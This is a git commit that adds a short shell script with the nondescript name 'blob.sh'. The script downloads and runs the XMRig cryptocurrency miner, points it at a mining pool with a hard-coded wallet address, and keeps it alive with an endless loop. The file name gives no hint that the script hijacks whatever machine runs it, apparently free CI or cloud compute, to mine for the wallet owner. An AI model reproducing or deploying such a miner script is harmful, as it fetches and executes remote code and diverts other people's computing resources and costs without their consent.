86763a098fa737e01a970bd894b3321465f55749
Isthifa <85566406+Isthifa@users.noreply.github.com>
2021-06-25 18:33:38 +0530

    Create blob.sh

---
+++ blob.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+tar xf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2
+./xmrig -o rx-us.unmineable.com:3333 -a rx -k -u WIN:TNm3k3uCQXtfYhwPZFzNq4dTCPumBSfYNp.networ#fuz4-8kaj -p x
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
